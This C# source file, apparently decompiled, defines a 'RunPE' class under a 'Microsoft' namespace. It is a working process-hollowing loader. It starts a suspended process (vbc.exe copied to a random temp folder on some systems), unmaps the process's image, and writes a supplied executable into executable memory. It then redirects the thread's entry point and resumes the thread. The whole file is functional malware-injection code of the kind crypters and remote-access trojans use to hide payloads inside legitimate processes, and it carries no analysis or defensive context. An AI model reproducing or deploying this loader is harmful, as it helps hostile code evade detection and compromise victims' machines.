using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Microsoft;

public class RunPE
{
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualProtectEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, ref int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool SetThreadContext(IntPtr intptr_0, uint[] uint_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ResumeThread(IntPtr intptr_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	[DllImport("ntdll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern uint NtUnmapViewOfSection(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool GetThreadContext(IntPtr intptr_0, uint[] uint_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool CreateProcessA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, byte[] byte_0, IntPtr[] intptr_3);

	public static void PE(byte[] data)
	{
		string value = Assembly.GetEntryAssembly()!.Location;
		if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
		{
			value = Conversions.ToString(Environment.SystemDirectory[0]) + ":\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";
			string text = Path.ChangeExtension(Path.Combine(Path.GetTempPath() + Path.GetRandomFileName() + "\\", "vbc"), "exe");
			string directoryName = Path.GetDirectoryName(text);
			Directory.CreateDirectory(directoryName);
			File.Copy(value, text);
			value = text;
		}
		int num = BitConverter.ToInt32(data, 60);
		checked
		{
			int num2 = BitConverter.ToInt16(data, num + 6);
			IntPtr intptr_ = new IntPtr(BitConverter.ToInt32(data, num + 84));
			byte[] byte_ = new byte[68];
			IntPtr[] array = new IntPtr[4];
			string string_ = null;
			StringBuilder stringBuilder_ = new StringBuilder(value);
			string string_2 = null;
			IntPtr intPtr = default(IntPtr);
			if (!CreateProcessA(ref string_, stringBuilder_, intPtr, intPtr, bool_0: false, 4, intPtr, ref string_2, byte_, array))
			{
				return;
			}
			uint[] array2 = new uint[179];
			array2[0] = 65538u;
			if (GetThreadContext(array[1], array2))
			{
				IntPtr intptr_2 = array[0];
				IntPtr intptr_3 = new IntPtr(unchecked((long)array2[41]) + 8L);
				IntPtr intptr_4 = new IntPtr(4);
				IntPtr intptr_5 = default(IntPtr);
				IntPtr intptr_6 = default(IntPtr);
				if (ReadProcessMemory(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)NtUnmapViewOfSection(array[0], intptr_5)) == 0L)
				{
					IntPtr intptr_7 = array[0];
					IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(data, num + 52));
					IntPtr intptr_8 = intPtr2;
					IntPtr intptr_9 = new IntPtr(BitConverter.ToInt32(data, num + 80));
					IntPtr intptr_10 = VirtualAllocEx(intptr_7, intptr_8, intptr_9, 12288, 64);
					WriteProcessMemory(array[0], intptr_10, data, intptr_, ref intptr_6);
					int num3 = num2 - 1;
					for (int i = 0; i <= num3; i++)
					{
						int[] array3 = new int[10];
						Buffer.BlockCopy(data, num + 248 + i * 40, array3, 0, 40);
						byte[] array4 = new byte[array3[4] - 1 + 1];
						Buffer.BlockCopy(data, array3[5], array4, 0, array4.Length);
						IntPtr intptr_11 = array[0];
						intptr_9 = new IntPtr(intptr_10.ToInt32() + array3[3]);
						IntPtr intptr_12 = intptr_9;
						intPtr2 = new IntPtr(array4.Length);
						WriteProcessMemory(intptr_11, intptr_12, array4, intPtr2, ref intptr_6);
					}
					IntPtr intptr_13 = array[0];
					intptr_9 = new IntPtr(unchecked((long)array2[41]) + 8L);
					IntPtr intptr_14 = intptr_9;
					byte[] bytes = BitConverter.GetBytes(intptr_10.ToInt32());
					intPtr2 = new IntPtr(4);
					WriteProcessMemory(intptr_13, intptr_14, bytes, intPtr2, ref intptr_6);
					array2[44] = (uint)(intptr_10.ToInt32() + BitConverter.ToInt32(data, num + 40));
					SetThreadContext(array[1], array2);
				}
			}
			ResumeThread(array[1]);
		}
	}
}
